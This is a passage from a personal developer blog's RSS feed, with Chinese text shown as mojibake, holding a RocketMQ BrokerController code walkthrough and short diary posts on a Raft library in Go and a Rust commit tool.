&lt;p&gt;æœåŠ¡æ§åˆ¶å¯¹è±¡ï¼š Brokerå„ä¸ªæœåŠ¡æ§åˆ¶å™¨ï¼ŒåŒ…æ‹¬å­˜å‚¨å±‚é…ç½®ï¼Œé…ç½®æ–‡ä»¶ç‰ˆæœ¬å·ï¼Œæ¶ˆè´¹è¿›åº¦å­˜å‚¨ï¼ŒConsumerè¿æ¥ã€è®¢é˜…å…³ç³»ç®¡ç†ç­‰ç­‰ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ä»¥ä¸Šå°±æ˜¯&lt;code&gt;createBrokerController&lt;/code&gt;çš„å†…å®¹ï¼Œå‡½æ•°è™½ç„¶é•¿ï¼Œä½†æ˜¯å¹¶ä¸å¤æ‚ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢ä¸º&lt;code&gt;start&lt;/code&gt;å‡½æ•°çš„å†…å®¹, åœ¨&lt;code&gt;main&lt;/code&gt;ä¸­çš„&lt;code&gt;start&lt;/code&gt;å‡½æ•°å®é™…ä¸Šæ˜¯å»å§”æ‰˜äº†&lt;code&gt;BrokerController&lt;/code&gt;å»æ‰§è¡Œ.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// å¯åŠ¨Brokerçš„å„å±‚æœåŠ¡
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;messageStore&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;messageStore&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;remotingServer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;remotingServer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;brokerOuterAPI&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;brokerOuterAPI&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;pullRequestHoldService&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;pullRequestHoldService&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;clientHousekeepingService&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;clientHousekeepingService&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;filterServerManager&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;filterServerManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// å¯åŠ¨æ—¶ï¼Œæ³¨å†Œè¯¥Brokerçš„ä¿¡æ¯åˆ°æ‰€æœ‰çš„NameServer
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;registerBrokerAll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// å®šæ—¶æ³¨å†ŒBrokeråˆ°Name Server
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;scheduledExecutorService&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;scheduleAtFixedRate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;registerBrokerAll&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;registerBrokerAll Exception&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;1000&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;1000&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TimeUnit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;MILLISECONDS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;brokerStatsManager&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;// çœ‹èµ·æ¥å°±æ˜¯ä¸€äº›æ•°æ®ç»Ÿè®¡çº¿ç¨‹
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;brokerStatsManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;// åˆ é™¤å¤šä½™çš„Topic
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addDeleteTopicTask&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ•´ä¸ªBorkerçš„æµç¨‹å·®ä¸å¤šå°±æ˜¯è¿™æ ·.ä»£ç é‡Œå¹¶æ²¡æœ‰ä»€ä¹ˆäº®ç‚¹è¯´å®è¯.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>æ—¥å¿—</title>
        <link>https://sdttttt.github.io/p/%E6%97%A5%E5%BF%97/</link>
        <pubDate>Sun, 11 Oct 2020 14:45:23 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/%E6%97%A5%E5%BF%97/</guid>
        <description>&lt;p&gt;æ˜¨å¤©éª‘è‡ªè¡Œè½¦ä¸‹ç­å›æ¥åè¨éº»ç–¹åˆçŠ¯äº†, å®åœ¨æ˜¯æ¯”è¾ƒéš¾å—, ä»Šå¤©ç®—æ˜¯å»äº†è¶Ÿçš®è‚¤ç—…åŒ»é™¢.&lt;/p&gt;
&lt;p&gt;ç®—æ˜¯é…äº†ç‚¹è¯.
å¸Œæœ›èƒ½å¥½ä¸€ç‚¹.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Sraft (ä¸‰)</title>
        <link>https://sdttttt.github.io/p/sraft-%E4%B8%89/</link>
        <pubDate>Fri, 09 Oct 2020 10:52:24 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/sraft-%E4%B8%89/</guid>
        <description>&lt;p&gt;ç»è¿‡å‡ å¤©æ€è€ƒ, æˆ‘å†³å®šç¨å¾®é‡æ–°åˆ†é…ä¸€ä¸‹å„ä¸ªæ¨¡å—çš„å¯†åº¦.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;RaftKernel&lt;/code&gt;ä¸­çš„&lt;code&gt;Solt&lt;/code&gt;ä¸ºæœ¬æ¬¡çš„é‡ç‚¹.å¯¹&lt;code&gt;RaftKernel&lt;/code&gt;æ¥è¯´&lt;code&gt;Solt&lt;/code&gt;ä¸ºä¸€ä¸ªé»‘ç›’.&lt;code&gt;Solt&lt;/code&gt;å¯¹å¤–å¤„ç†æ‰€æœ‰äº‹ä»¶,ä½†æ˜¯ä¸æš´éœ²å®ç°.
å†…éƒ¨çš„çŠ¶æ€æœºè½¬åŒ–ä¹Ÿå¯¹&lt;code&gt;RaftKernel&lt;/code&gt;è¿›è¡Œéšè—.&lt;code&gt;RaftKernel&lt;/code&gt;åªè¦æ¥å—å¤–ç•ŒAE, äº¤ç»™&lt;code&gt;Solt&lt;/code&gt;, &lt;code&gt;Solt&lt;/code&gt;åé¦ˆç›¸åº”çš„äº‹ä»¶, &lt;code&gt;RaftKernel&lt;/code&gt;è¿›è¡Œå¤„ç†.&lt;/p&gt;
&lt;p&gt;æŒ–è—•, å¸Œæœ›è¿™æ¬¡æœ‰æ•ˆ.&lt;img src=&#34;https://idanmu.net/2020/10/c003543193753.jpg&#34; alt=&#34;dc77f6e30c4b4dba807b4a84b29c74d4.jpg&#34;  /&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Essays</title>
        <link>https://sdttttt.github.io/p/essays/</link>
        <pubDate>Tue, 06 Oct 2020 12:34:31 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/essays/</guid>
        <description>&lt;p&gt;å‰å‡ å¤©å»æœ‹å‹é‚£è¾¹ç©äº†ä¸€è¶Ÿ, äº‹å®ä¸Šå¹¶æ²¡æœ‰ä»€ä¹ˆå¥½ç©çš„.
è¿™å‡ å¤©ä»€ä¹ˆä¹Ÿæ²¡åš. sraftä¹Ÿæ²¡æœ‰ä»€ä¹ˆè¿›å±•.&lt;/p&gt;
&lt;p&gt;æˆ‘åˆé‡æ–°å¯¹Ruby on Rails æ„Ÿå…´è¶£äº†.ä½†æ˜¯æ²¡æœ‰ä¸€ä¸ªå¾ˆå¥½çš„ç¯å¢ƒå†™è¿™ä¸ªä¸œè¥¿.è¿˜æ˜¯ç®—äº†.&lt;/p&gt;
&lt;p&gt;è¿˜æ˜¯æƒ³æƒ³ä¸‹ä¸€ä¸ªé¡¹ç›®å†™ä»€ä¹ˆæ¯”è¾ƒå¥½.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>GRC (äºŒ)</title>
        <link>https://sdttttt.github.io/p/grc-%E4%BA%8C/</link>
        <pubDate>Thu, 01 Oct 2020 15:24:27 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/grc-%E4%BA%8C/</guid>
        <description>&lt;p&gt;æ˜¨å¤©å§‘ä¸”ç®—æ˜¯å®Œæˆäº†GRCçš„å¼€å‘. pushè¿™ä¸ªå‘½ä»¤ä¸æ˜¯å¾ˆæƒ³åŠ ,æƒ³äº†ä¸€ä¸‹ä¹Ÿæ²¡æœ‰å¿…è¦.&lt;/p&gt;
&lt;p&gt;GRCçš„&lt;code&gt;0.8.0&lt;/code&gt;ç‰ˆæœ¬æ˜¨å¤©ç®—æ˜¯å‘å¸ƒäº†, åº”è¯¥ä¹Ÿç®—æ˜¯å¤´ä¸€æ¬¡æ­£ç»çš„ç”¨Rustæ¥å¼€å‘è½¯ä»¶.&lt;/p&gt;
&lt;p&gt;åœ¨crate.ioä¸Šçœ‹èµ·æ¥æœ‰100çš„å®‰è£…äº†. ä¸çŸ¥é“ä»–ä»¬è„¸ä¸Šæ˜¯ä»€ä¹ˆè¡¨æƒ… wwww&lt;/p&gt;
&lt;p&gt;å¸Œæœ›GRCèƒ½ç»™ä»–ä»¬å¸¦å»æ–¹ä¾¿å§.&lt;/p&gt;
&lt;p&gt;å½“ç„¶, GRCçš„ç»ˆç‚¹è¿˜æ²¡åˆ°. æˆ‘ä¼šä¸€ç›´ä½¿ç”¨è¿™ä¸ªå·¥å…·. ç¢°åˆ°BUGæˆ–è€…æœ‰æ–°æƒ³æ³•è‚¯å®šä¼šå»æ›´æ–°.å†µä¸”ç°åœ¨è¿&lt;code&gt;1.0.0&lt;/code&gt;ç‰ˆæœ¬éƒ½è¿˜æ²¡åˆ°.&lt;/p&gt;
&lt;p&gt;æ¥ä¸‹æ¥ä¸»è¦å·¥ä½œä¼šä¸“æ³¨åˆ°å­¦ä¹ åŠ å¯†ç®—æ³•,å’Œsraftçš„å¼€å‘ä¸Š.&lt;/p&gt;
&lt;p&gt;&amp;hellip;sraftä¸€ç›´éƒ½æ²¡æœ‰ä»€ä¹ˆå¥½çš„æƒ³æ³•å•Š&amp;hellip;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>GRC (ä¸€)</title>
        <link>https://sdttttt.github.io/p/grc-%E4%B8%80/</link>
        <pubDate>Sat, 26 Sep 2020 14:49:17 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/grc-%E4%B8%80/</guid>
        <description>&lt;p&gt;ooo! ä¸€ä¸ªä¸é”™çš„æ¶ˆæ¯.&lt;/p&gt;
&lt;p&gt;ç›®å‰GRCçš„commitè§„èŒƒçš„åŠŸèƒ½å·²ç»å®Œå…¨å®ç°äº†.
ä¹‹å‰è¿˜è¯´è¦å‡ ä¸ªæ˜ŸæœŸ, çœ‹æ¥æ¯”æˆ‘æƒ³å¾—è¦å¿«å¾ˆå¤š
&lt;del&gt;ğŸ‘´å‹¤å‹‰&lt;/del&gt;
åŸºæœ¬ä¸Šå·²ç»å’Œgit-czæœ‰ç€å®Œå…¨ä¸€è‡´çš„åŠŸèƒ½.
æˆ‘ä¹Ÿå·²ç»æŠŠGRCå‘å¸ƒåœ¨äº†crates.ioç½‘ç«™ä¸Š.
åœ¨crates.ioä¸Šæœç´¢grcå°±èƒ½çœ‹åˆ°.
åŒæ—¶æˆ‘ä¹Ÿåœ¨v2exä¸Šå†™äº†å…³äºGRCçš„æ–‡ç« .&lt;/p&gt;
&lt;p&gt;å¼€å‘ä¹Ÿä¼šç»§ç»­è¿›è¡Œ, GRCä¼šåœ¨ä»¥åä¸ºä½ æä¾›æ›´æ–¹ä¾¿çš„åŠŸèƒ½.
æˆ‘ä¹ŸæœŸå¾…æœ‰äººèƒ½å‚ä¸åˆ°è¿™ä¸ªé¡¹ç›®ä¸­æ¥.&lt;/p&gt;
&lt;p&gt;å¸Œæœ›GRCèƒ½å¸®åŠ©æ›´å¤šäºº.&lt;/p&gt;
</description>
        </item>
        <item>
        <title>sraft (äºŒ)</title>
        <link>https://sdttttt.github.io/p/sraft-%E4%BA%8C/</link>
        <pubDate>Tue, 22 Sep 2020 12:08:44 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/sraft-%E4%BA%8C/</guid>
        <description>&lt;p&gt;æ˜¨å¤©è‰è‰çš„å®Œæˆäº†é€šä¿¡åè®®é€‚é…å™¨, è‡³å°‘èƒ½åšåˆ°è‡ªç”±åˆ‡æ¢åè®®,
çºµçœ‹æ•´ä¸ªç¼–ç¨‹æ¨¡å‹è¿˜æ˜¯æœ‰ç¼ºé™·,
StateMachineçš„å†…éƒ¨ç»“æ„æ¯”æˆ‘æƒ³çš„è¦å¤æ‚çš„å¤š,
å¤šä¸ªçŠ¶æ€å®ç°çš„åˆ‡æ¢,ä»¥åŠå¯¹ä¸€äº›å†…éƒ¨äº‹ä»¶çš„è§¦å‘.
StateMachineæ¨¡å—çš„å¯†åº¦å’Œå…¶ä»–æ¨¡å—å®Œå…¨ä¸åŒ. åè€ŒRaftKernelå­˜åœ¨çš„æ„ä¹‰å´å‡å°äº†.&lt;/p&gt;
&lt;p&gt;ç»è¿‡æ˜¨å¤©æ™šä¸Šå’Œä»Šæ—©çš„è€ƒè™‘, æˆ‘å†³å®šå°†StateMachineä½œä¸ºä¸€ä¸ªSlot,æ¥å…¥åˆ°RaftKernelä¸­å»,
RaftKernelç°åœ¨åŒæ—¶ä¹Ÿæ˜¯çŠ¶æ€æœºæœ¬èº«, Slotæ˜¯å¯å˜çš„, å¯ä»¥æœ‰Leader, Follower, Candidateä¸‰ç§æ’æ§½,æ¯ä¸ªSlotéƒ½æœ‰ä¸åŒçš„æ‰©å±•å­—æ®µ, æ¯”å¦‚Leaderä¼šéœ€è¦ç™»è®°æ¯ä¸ªNodeçš„åŒæ­¥æ—¥å¿—çš„æ·±åº¦ä»¥åŠçŠ¶æ€. å¹¶ä¸”æ¯ä¸ªSlotéƒ½æœ‰è‡ªå·±çš„äº‹ä»¶å¤„ç†å®ç°.&lt;/p&gt;
&lt;p&gt;æ²¡æƒ³åˆ°ç¬¬ä¸€å¤©å¼€å‘ç»“æŸå°±ä¼šé‡åˆ°éº»çƒ¦, çœ‹æ¥sraftä»¥åçš„è‹¦éš¾è¿˜ä¸å°‘&amp;hellip;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Sraft (ä¸€)</title>
        <link>https://sdttttt.github.io/p/sraft-%E4%B8%80/</link>
        <pubDate>Mon, 21 Sep 2020 11:29:51 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/sraft-%E4%B8%80/</guid>
        <description>&lt;p&gt;ä»Šå¤©å¼€å§‹ç®—æ˜¯æ­£å¼ç¼–å†™Sraftè¿™ä¸ªåº“, å¼€å‘çš„åŸå› æœ‰ä¸¤ä¸ª:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æˆ‘éœ€è¦é€šè¿‡è¿™æ¬¡å¼€å‘æ¥ç†Ÿæ‚‰Raftè¿™ä¸ªåè®®.&lt;del&gt;(ä»¥åé¢è¯•æˆ–è€…å’Œäººæ”€è°ˆä¹Ÿæ›´æœ‰åº•æ°”)&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;æˆ‘çš„å¾®æœåŠ¡æ¡†æ¶çš„æœåŠ¡ä¸­å¿ƒéœ€è¦ä¸€ä¸ªèƒ½è¾¾æˆåˆ†å¸ƒå¼ä¸€è‡´æ€§çš„åŠŸèƒ½.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è¯­è¨€é‡‡ç”¨çš„æ˜¯Go, ç›®å‰çš„ç¼–ç¨‹æ¨¡å‹å¤§æ¦‚ä¹Ÿå®Œæˆäº†, ä¸‹é¢æˆ‘æ¥ä»‹ç»:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æœ¬äººå–œæ¬¢ç®€å•å¹¶ä¸”é«˜æ•ˆçš„è®¾è®¡, å¯¹äºè®¾è®¡å¤æ‚éš¾ä»¥å®ç°çš„ä¸œè¥¿ä¼šæ„Ÿåˆ°ä¸é€‚(è„‘å­ä¸å¤Ÿç”¨),&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;raft-kernel&#34;&gt;Raft Kernel&lt;/h3&gt;
&lt;p&gt;æ•´ä¸ªç¼–ç¨‹æ¨¡å‹ä¼šæœ‰æ¯”è¾ƒå¤šçš„æ¨¡å—, æ•´ä½“é‡‡ç”¨çš„æ˜¯å¾®æ ¸æ¶æ„, &lt;code&gt;Raft Kernel&lt;/code&gt;ä¼šåè°ƒå„ä¸ªæ¨¡å—ä¹‹é—´çš„å·¥ä½œ.&lt;/p&gt;
&lt;p&gt;æ¨¡å—ä¹‹é—´çš„é€šä¿¡ç”±&lt;code&gt;Raft Kernel&lt;/code&gt;æ¥å®Œæˆ. é€šä¿¡æ–¹å¼é‡‡ç”¨&lt;code&gt;Channel&lt;/code&gt;å¼‚æ­¥éé˜»å¡çš„å½¢å¼.&lt;/p&gt;
&lt;h3 id=&#34;exchange-network&#34;&gt;Exchange Network&lt;/h3&gt;
&lt;p&gt;å¤–éƒ¨é€šä¿¡ä»è¿™é‡Œè¿›å…¥, ç”±&lt;code&gt;Exchange Network&lt;/code&gt;å°†é€šä¿¡å†…å®¹å°è£…ä¸ºäº‹ä»¶, å‘é€ç»™&lt;code&gt;Raft Kernel&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;æˆ–è€…&lt;code&gt;Raft Kernel&lt;/code&gt;ä¼ é€’äº‹ä»¶ç»™&lt;code&gt;Exchange Network&lt;/code&gt;, å†ç”±&lt;code&gt;Exchange Network&lt;/code&gt;æ‰§è¡Œå¤–éƒ¨é€šä¿¡.&lt;/p&gt;
&lt;h3 id=&#34;state-machine&#34;&gt;State Machine&lt;/h3&gt;
&lt;p&gt;Raftåè®®çš„æ ¸å¿ƒå®ç°, çŠ¶æ€æœºä¼šåœ¨&lt;code&gt;Leader&lt;/code&gt;, &lt;code&gt;Follower&lt;/code&gt;, &lt;code&gt;Candidate&lt;/code&gt;ä¸‰ç§è§’è‰²ä¹‹é—´è‡ªåŠ¨åˆ‡æ¢,
æ¯ä¸€è§’è‰²å¤„ç†çš„äº‹ä»¶éƒ½æ˜¯ä¸€æ ·çš„, ä½†æ˜¯å…·ä½“è¿‡ç¨‹æ˜¯ä¸ä¸€æ ·çš„. (è¿™ä¸ªéƒ¨åˆ†çš„å¯†åº¦ä¼šæ¯”è¾ƒå¤§)&lt;/p&gt;
&lt;h3 id=&#34;data-log-synchronizer&#34;&gt;Data Log Synchronizer&lt;/h3&gt;
&lt;p&gt;è´Ÿè´£åŒæ­¥æ•°æ®çš„æ¨¡å—, é‡‡ç”¨çš„æ˜¯æ—¥å¿—æäº¤å½¢å¼.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;ä»¥ä¸Šçš„æˆ‘ç›®å‰å·²ç»æ„æ€å‡ºçš„ç¼–ç¨‹æ¨¡å‹, ä½†æ˜¯ä¸ºæš‚å®š. å®é™…çš„ç¼–å†™æ¨¡å‹è‚¯å®šä¼šæœ‰å°‘è®¸ä¿®æ”¹.&lt;/p&gt;
&lt;p&gt;PROJECT: github.com/sdttttt/sraft&lt;/p&gt;
</description>
        </item>
        <item>
        <title>About Gcr</title>
        <link>https://sdttttt.github.io/p/about-gcr/</link>
        <pubDate>Sun, 20 Sep 2020 13:20:06 +0800</pubDate>
        
        <guid>https://sdttttt.github.io/p/about-gcr/</guid>
        <description>&lt;p&gt;åå¤šå¤©å‰, æˆ‘åˆ›å»ºäº†GCRè¿™ä¸ªé¡¹ç›®, åŸå› æ¯”è¾ƒçº¯ç²¹,
